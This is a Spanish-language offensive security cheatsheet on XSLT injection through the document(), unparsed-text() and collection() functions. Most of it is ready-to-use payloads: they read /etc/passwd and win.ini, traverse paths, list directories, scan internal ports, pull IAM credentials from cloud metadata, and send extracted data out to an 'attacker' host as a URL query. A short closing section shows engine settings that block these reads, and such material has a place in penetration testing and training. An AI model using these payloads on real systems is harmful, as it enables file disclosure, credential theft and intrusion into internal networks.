---
aliases:
  - XSLT document function
  - XSLT File Read
  - XSLT LFI
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - vuln/lfi
  - technique/collection
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
---
# XSLT - Lectura de Archivos (document)

***

## Cheatsheet

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|---|
| **Leer archivo local (Unix)** | `<xsl:copy-of select="document('file:///etc/passwd')"/>` | Parsea como XML — falla si no es XML válido. Ver "Raw read" abajo. |
| **Leer como text (unparsed-text, XSLT 2.0+)** | `<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>` | Requiere XSLT 2.0/3.0 (Saxon). Lee cualquier texto, no solo XML. |
| **Leer archivo remoto (HTTP)** | `<xsl:copy-of select="document('http://attacker/evil.xml')"/>` | SSRF via XSLT → fetch remoto + parse. |
| **Leer Windows** | `<xsl:copy-of select="document('file:///C:/Windows/win.ini')"/>` | Mismo vector en Windows. |
| **Listar directorio (Saxon)** | `<xsl:for-each select="collection('file:///etc/?select=*')">...</xsl:for-each>` | Saxon 9+ con `collection()`. |
| **Document con XInclude** | `<xsl:copy-of select="document('../etc/passwd')"/>` | Path traversal relativo al stylesheet loader. |
| **Chain document() → SSRF interno** | `<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>` | Cloud metadata via XSLT → SSRF. |
| **Document con callback OOB** | `<xsl:copy-of select="document(concat('http://attacker/?d=', $data))"/>` | Exfil datos extraídos via URL query. |
^xslt-document

___

## Overview

Función `document()` en XSLT permite cargar un XML externo — **local file o URL remota** — dentro del stylesheet para procesarlo. Si el backend deja al atacante controlar el argumento, = file read arbitrario + SSRF.

### Diferencias por versión

| Función | XSLT 1.0 | XSLT 2.0 | XSLT 3.0 |
|---|---|---|---|
| `document()` | ✓ Parse XML | ✓ | ✓ |
| `unparsed-text()` | ✗ | ✓ Plain text | ✓ |
| `collection()` | ✗ | ✓ Enum dirs | ✓ |
| `doc()` | ✗ | ✓ | ✓ |
| `available-environment-variables()` | ✗ | ✗ | ✓ |

### Raw file read — trick

`document()` en XSLT 1.0 falla si el archivo NO es XML válido (ej: `/etc/passwd` no es XML). Bypass:

**Opción A — XSLT 2.0+ `unparsed-text()`:**
```xml
<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
```

**Opción B — wrap con CDATA (XSLT 1.0 libxslt trick):**
```xml
<xsl:copy-of select="document('file:///etc/passwd')"/>
<!-- Fallará parseando — pero muchas implementaciones muestran contenido en error. -->
```

**Opción C — base64 encode remoto:**
```xml
<xsl:value-of select="document(concat('http://attacker/wrap.xsl?f=', 'target-file'))"/>
```
Atacante sirve XSL que lee el archivo en el backend + lo base64-encodea para que sí sea XML válido.

### SSRF chain

`document()` acepta URLs HTTP — convierte XSLT injection en SSRF completo:
```xml
<!-- Port scan interno -->
<xsl:copy-of select="document('http://127.0.0.1:22/')"/>
<xsl:copy-of select="document('http://127.0.0.1:6379/info')"/>

<!-- Cloud metadata -->
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>

<!-- Interno LAN -->
<xsl:copy-of select="document('http://10.0.0.1/admin')"/>
```

Ver [[Server-Side Request Forgery (SSRF)]] para post-explotación de SSRF.

### Path traversal

`document()` respeta path relativo al stylesheet loader. Si el XSL se carga desde `/var/www/xsl/` → `../` sube dirs:
```xml
<xsl:copy-of select="document('../../etc/passwd')"/>
```

### Limitaciones por motor

| Motor | `document()` | `unparsed-text()` | Notas |
|---|---|---|---|
| **libxslt** | ✓ | ✗ (1.0 only) | PHP / Python — path traversal funciona. |
| **Saxon-HE** | ✓ | ✓ | Java — soporta URI schemes completos (incl. jar://). |
| **Xalan** | ✓ | ✗ | Java 1.0. |
| **MSXML** | ✓ (con config) | ✗ | Default restrictivo en versiones modernas. |

### Bloqueo defender

Muchos motores tienen flag `EntityResolver` / `URIResolver` que limita URIs. PHP libxslt:
```php
$xsl->setSecurityPrefs(XSL_SECPREF_NONE); // vulnerable
$xsl->setSecurityPrefs(XSL_SECPREF_DEFAULT); // bloquea file:// + write
```

Saxon:
```java
factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
```

Si el flag está activo pero `file://` sigue funcionando → misconfig común.

***
